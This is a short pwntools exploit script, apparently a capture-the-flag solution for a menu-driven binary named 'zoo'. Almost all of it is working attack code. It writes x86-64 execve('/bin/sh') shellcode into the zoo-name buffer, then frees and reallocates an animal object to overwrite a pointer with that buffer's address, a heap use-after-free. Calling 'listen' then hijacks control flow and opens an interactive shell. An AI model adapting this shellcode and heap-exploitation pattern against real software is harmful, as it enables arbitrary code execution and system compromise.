from pwn import *

p = process("./zoo")

# Name of Your zoo :
cmd = lambda c : p.sendlineafter("Your choice :" , str(c))
def addDog(name , Weight):
	cmd(1)
	p.sendlineafter("Name : " , name)
	p.sendlineafter("Weight : " , Weight)

def listen(index):
	cmd(3)
	p.sendlineafter("index of animal :" , str(index))

def showinfo(index):
	cmd(4)
	p.sendlineafter("index of animal : " , str(index))

def remove(index):
	cmd(5)
	p.sendlineafter("index of animal : " , str(index))
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
name = 0x605420
p.sendlineafter("Name of Your zoo :" , "a" * 8 + p64(name+0x10) + sc)
addDog("a" * 8 , "0")
addDog("b" * 8 , "1")
remove(0)
gdb.attach(p , "b malloc")
addDog("a" * 0x48 + p64(name) , "3")

listen(0)

p.interactive()
